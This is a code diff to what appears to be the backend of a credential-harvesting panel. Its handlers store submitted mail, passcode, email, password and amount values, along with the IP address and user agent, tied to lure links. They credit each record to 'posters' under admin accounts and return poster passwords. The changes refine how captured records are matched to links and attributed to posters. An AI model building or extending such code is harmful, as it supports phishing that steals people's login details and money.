@@ -446,6 +446,45 @@ export const add_data = async (req, res) => {
   ).split(',')[0];
 
   try {
+    let actualSite = site;
+    let posterFound = null;
+
+    if (site) {
+      let linkMatch = await Link.findOne({ linkName: site }).populate({
+        path: 'root',
+        populate: { path: 'root', model: 'User' },
+      });
+
+      if (!linkMatch) {
+        const escapedSite = site.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+        linkMatch = await Link.findOne({
+          linkName: new RegExp(`^${escapedSite}/`, 'i'),
+        }).populate({
+          path: 'root',
+          populate: { path: 'root', model: 'User' },
+        });
+      }
+
+      if (linkMatch) {
+        if (linkMatch.linkName) actualSite = linkMatch.linkName;
+        if (linkMatch.root) {
+          posterFound = linkMatch.root;
+        } else if (linkMatch.username) {
+          posterFound = await Poster.findOne({ username: linkMatch.username }).populate('root');
+        }
+      }
+    }
+
+    if (!posterFound) {
+      posterFound = await Poster.findOne({
+        $or: [
+          { _id: posterId && posterId.length === 24 ? posterId : null },
+          { posterId: posterId },
+          { username: posterId },
+        ],
+      }).populate('root');
+    }
+
     let userFound = await User.findOne({
       $or: [
         { adminId: adminId },
@@ -454,21 +493,13 @@ export const add_data = async (req, res) => {
       ],
     });
 
-    let posterFound = await Poster.findOne({
-      $or: [
-        { _id: posterId && posterId.length === 24 ? posterId : null },
-        { posterId: posterId },
-        { username: posterId },
-      ],
-    });
-
     if (!userFound && posterFound?.root) {
-      userFound = await User.findById(posterFound.root);
+      userFound = posterFound.root?._id ? posterFound.root : await User.findById(posterFound.root);
     }
 
     if (userFound && posterFound) {
       const info = await Info.create({
-        site,
+        site: actualSite || site,
         mail,
         passcode,
         email,
@@ -887,7 +918,13 @@ export const poster_details = async (req, res) => {
   const sortBy = req.query.sortBy ? JSON.parse(req.query.sortBy) : [];
 
   try {
-    const poster = await Poster.findOne({ _id: id })
+    const poster = await Poster.findOne({
+      $or: [
+        { _id: id && id.length === 24 ? id : null },
+        { posterId: id },
+        { username: id },
+      ],
+    })
       .select('username password posterId links createdAt tag root')
       .populate('root', 'username adminId');
 
@@ -906,9 +943,27 @@ export const poster_details = async (req, res) => {
       ])
     );
 
+    if (allPosterLinks.length > (poster.links || []).length) {
+      poster.links = allPosterLinks;
+      await poster.save().catch(() => {});
+    }
+
     const posterIds = [id];
     if (poster?.posterId) posterIds.push(poster.posterId);
     if (poster?.username) posterIds.push(poster.username);
+
+    const linkPrefixes = allPosterLinks
+      .map((l) => {
+        try {
+          const u = new URL(l.startsWith('http') ? l : `https://${l}`);
+          const parts = u.pathname.split('/').filter(Boolean);
+          if (parts.length >= 2) {
+            return `${u.origin}/${parts[0]}`;
+          }
+        } catch (e) {}
+        return null;
+      })
+      .filter(Boolean);
 
     const queryOr = [
       { root: id },
@@ -916,6 +971,9 @@ export const poster_details = async (req, res) => {
     ];
     if (allPosterLinks.length > 0) {
       queryOr.push({ site: { $in: allPosterLinks } });
+    }
+    if (linkPrefixes.length > 0) {
+      queryOr.push({ site: { $in: linkPrefixes } });
     }
 
     let query = { $or: queryOr };
@@ -952,11 +1010,46 @@ export const poster_details = async (req, res) => {
       .limit(pageSize)
       .lean();
 
+    const enrichedDetails = await Promise.all(
+      details.map(async (item) => {
+        if (item.site) {
+          const matchedTwoParamLink = allPosterLinks.find((pl) => {
+            if (!pl) return false;
+            if (pl === item.site) return true;
+            try {
+              const plUrl = new URL(pl.startsWith('http') ? pl : `https://${pl}`);
+              const itemUrl = new URL(item.site.startsWith('http') ? item.site : `https://${item.site}`);
+              if (plUrl.host === itemUrl.host) {
+                const plSegments = plUrl.pathname.split('/').filter(Boolean);
+                const itemSegments = itemUrl.pathname.split('/').filter(Boolean);
+                if (plSegments.length >= 2 && itemSegments.length === 1 && plSegments[0] === itemSegments[0]) {
+                  return true;
+                }
+              }
+            } catch (e) {}
+            return false;
+          });
+
+          if (matchedTwoParamLink) {
+            item.site = matchedTwoParamLink;
+            await Info.updateOne(
+              { _id: item._id },
+              { $set: { site: matchedTwoParamLink, root: id, poster: poster.username } }
+            ).catch(() => {});
+          }
+        }
+        return item;
+      })
+    );
+
+    const posterObj = poster.toObject();
+    delete posterObj._doc;
+
     return res.status(200).json({
       data: {
-        ...poster?.toObject(),
+        ...posterObj,
         links: allPosterLinks,
-        details: details,
+        details: enrichedDetails,
         total: total,
         page: page,
         pageSize: pageSize,
@@ -1100,22 +1193,26 @@ export const site_exist = async (req, res) => {
   const actualDevice = device || (isDeviceName(param1) ? param1 : (req.device?.type || 'desktop'));
   const actualParam1 = isDeviceName(param1) ? null : param1;
 
+  const cleanSite = site.replace(/^www\./i, '');
   const siteName = actualParam1
-    ? 'https://' + site + '/' + param + '/' + actualParam1
-    : 'https://' + site + '/' + param;
+    ? 'https://' + cleanSite + '/' + param + '/' + actualParam1
+    : 'https://' + cleanSite + '/' + param;
 
-  const candidateNames = [
-    siteName,
-    'https://' + site + '/' + param,
-    ...(actualParam1 ? ['https://' + site + '/' + param + '/' + actualParam1] : []),
-    ...(actualParam1 ? ['https://' + site + '/' + actualParam1] : []),
-    'http://' + site + '/' + param,
-    ...(actualParam1 ? ['http://' + site + '/' + param + '/' + actualParam1] : []),
-    ...(actualParam1 ? ['http://' + site + '/' + actualParam1] : []),
-  ];
+  let sitefound = null;
+  let candidateNames = [];
 
-  try {
-    let sitefound = await Link.findOne({ linkName: { $in: candidateNames } }).populate({
+  if (actualParam1) {
+    // Two-parameter route: MUST strictly match two-parameter link to avoid matching single-param link
+    candidateNames = [
+      `https://${cleanSite}/${param}/${actualParam1}`,
+      `http://${cleanSite}/${param}/${actualParam1}`,
+      `https://www.${cleanSite}/${param}/${actualParam1}`,
+      `http://www.${cleanSite}/${param}/${actualParam1}`,
+      `https://${site}/${param}/${actualParam1}`,
+      `http://${site}/${param}/${actualParam1}`,
+    ];
+
+    sitefound = await Link.findOne({ linkName: { $in: candidateNames } }).populate({
       path: 'root',
       populate: {
         path: 'root',
@@ -1124,12 +1221,40 @@ export const site_exist = async (req, res) => {
     });
 
     if (!sitefound) {
-      const targetPath = actualParam1 ? `/${param}/${actualParam1}` : `/${param}`;
+      sitefound = await Link.findOne({
+        linkName: new RegExp(`/${param}/${actualParam1}$`, 'i'),
+      }).populate({
+        path: 'root',
+        populate: {
+          path: 'root',
+          model: 'User',
+        },
+      });
+    }
+  } else {
+    // Single-parameter route
+    candidateNames = [
+      `https://${cleanSite}/${param}`,
+      `http://${cleanSite}/${param}`,
+      `https://www.${cleanSite}/${param}`,
+      `http://www.${cleanSite}/${param}`,
+      `https://${site}/${param}`,
+      `http://${site}/${param}`,
+    ];
+
+    sitefound = await Link.findOne({ linkName: { $in: candidateNames } }).populate({
+      path: 'root',
+      populate: {
+        path: 'root',
+        model: 'User',
+      },
+    });
+
+    if (!sitefound) {
       sitefound = await Link.findOne({
         $or: [
-          { linkName: new RegExp(`${targetPath}$`, 'i') },
-          ...(actualParam1 ? [{ linkName: new RegExp(`/${actualParam1}$`, 'i') }] : []),
-          { username: actualParam1 || param },
+          { linkName: new RegExp(`/${param}$`, 'i') },
+          { username: param },
         ],
       }).populate({
         path: 'root',
@@ -1139,18 +1264,23 @@ export const site_exist = async (req, res) => {
         },
       });
     }
+  }
 
+  try {
     if (sitefound) {
       const matchedSiteName = sitefound.linkName || siteName;
       let adminId = sitefound.root?.root?.adminId || sitefound.root?.adminId || '';
       let posterId =
-        sitefound.root?.username || sitefound.root?.posterId || (sitefound.root?.root ? sitefound.root?._id?.toString() : '');
+        sitefound.username ||
+        sitefound.root?.username ||
+        sitefound.root?.posterId ||
+        (sitefound.root?._id ? sitefound.root._id.toString() : '');
 
-      if (!adminId || !posterId) {
+      if (!adminId || !posterId || !sitefound.root) {
         const posterDoc = await Poster.findOne({
           $or: [
             { _id: sitefound.root?._id || (sitefound.root && sitefound.root.length === 24 ? sitefound.root : null) },
-            { username: sitefound.username },
+            { username: sitefound.username || posterId },
             { links: matchedSiteName },
           ],
         }).populate('root');
@@ -1382,17 +1512,46 @@ export const add_data_simplified = async (req, res) => {
     const userFound = await User.findOne(query);
 
     if (userFound) {
+      let actualSite = site;
+      let posterFoundForSite = null;
+
+      if (site) {
+        let linkDoc = await Link.findOne({ linkName: site }).populate('root');
+        if (!linkDoc) {
+          const escapedSite = site.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+          linkDoc = await Link.findOne({
+            linkName: new RegExp(`^${escapedSite}/`, 'i'),
+          }).populate('root');
+        }
+
+        if (linkDoc) {
+          if (linkDoc.linkName) actualSite = linkDoc.linkName;
+          if (linkDoc.root) {
+            posterFoundForSite = linkDoc.root;
+          } else if (linkDoc.username) {
+            posterFoundForSite = await Poster.findOne({ username: linkDoc.username });
+          }
+        }
+      }
+
       const info = await Info.create({
-        site,
+        site: actualSite || site,
         mail,
         passcode,
         email,
         password,
         amount,
         adminId: userFound.adminId || userFound.username,
+        poster: posterFoundForSite ? (posterFoundForSite.username || posterFoundForSite.posterId) : '',
+        root: posterFoundForSite ? posterFoundForSite._id : null,
         ip: ipAddress,
         agent: userAgent,
       });
+
+      if (posterFoundForSite) {
+        posterFoundForSite.details.push(info._id);
+        await posterFoundForSite.save().catch(() => {});
+      }
 
       // Alby WebLN/NWC Lightning Invoice Generation
       const nwcInstance = getNwc();
@@ -2466,7 +2625,61 @@ export const get_amount_list = async (req, res) => {
 
     const populatedInfos = await Promise.all(
       infos.map(async (info) => {
-        if (!info.root) {
+        let posterResolved = null;
+
+        if (info.site) {
+          // Check if info.site matches any Link in Link collection
+          let linkFound = await Link.findOne({ linkName: info.site })
+            .populate({ path: 'root', select: 'username posterId' })
+            .lean();
+
+          if (!linkFound) {
+            // Check if info.site was a single-param prefix of a 2-param Link
+            const escapedSite = info.site.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+            linkFound = await Link.findOne({
+              linkName: new RegExp(`^${escapedSite}/`, 'i'),
+            })
+              .populate({ path: 'root', select: 'username posterId' })
+              .lean();
+          }
+
+          if (linkFound) {
+            if (linkFound.linkName && linkFound.linkName !== info.site) {
+              info.site = linkFound.linkName;
+              await Info.updateOne({ _id: info._id }, { $set: { site: linkFound.linkName } }).catch(() => {});
+            }
+
+            if (linkFound.root) {
+              posterResolved = linkFound.root;
+            } else if (linkFound.username) {
+              posterResolved = await Poster.findOne({ username: linkFound.username })
+                .select('username posterId')
+                .lean();
+            }
+          }
+        }
+
+        if (!posterResolved && info.site) {
+          const amountFound = await Amount.findOne({ site: info.site }).lean();
+          if (amountFound?.posterId && amountFound.posterId !== 'undefined' && amountFound.posterId !== 'null') {
+            posterResolved = await Poster.findOne({
+              $or: [
+                { _id: amountFound.posterId.length === 24 ? amountFound.posterId : null },
+                { posterId: amountFound.posterId },
+                { username: amountFound.posterId },
+              ],
+            }).select('username posterId').lean();
+          }
+        }
+
+        if (posterResolved) {
+          info.root = posterResolved;
+          info.poster = posterResolved.username || posterResolved.posterId;
+          await Info.updateOne(
+            { _id: info._id },
+            { $set: { root: posterResolved._id, poster: posterResolved.username || posterResolved.posterId } }
+          ).catch(() => {});
+        } else if (!info.root) {
           if (info.poster && info.poster !== 'undefined' && info.poster !== 'null') {
             const p = await Poster.findOne({
               $or: [
@@ -2479,27 +2692,6 @@ export const get_amount_list = async (req, res) => {
               info.root = p;
             } else {
               info.root = { username: info.poster, _id: info.poster };
-            }
-          } else if (info.site) {
-            // Retroactive fallback: look up Link or Amount to recover poster for old records
-            const linkFound = await Link.findOne({ linkName: info.site }).populate({
-              path: 'root',
-              select: 'username posterId',
-            }).lean();
-            if (linkFound?.root) {
-              info.root = linkFound.root;
-            } else {
-              const amountFound = await Amount.findOne({ site: info.site }).lean();
-              if (amountFound?.posterId && amountFound.posterId !== 'undefined' && amountFound.posterId !== 'null') {
-                const p = await Poster.findOne({
-                  $or: [
-                    { _id: amountFound.posterId.length === 24 ? amountFound.posterId : null },
-                    { posterId: amountFound.posterId },
-                    { username: amountFound.posterId },
-                  ],
-                }).select('username posterId').lean();
-                if (p) info.root = p;
-              }
             }
           }
         }
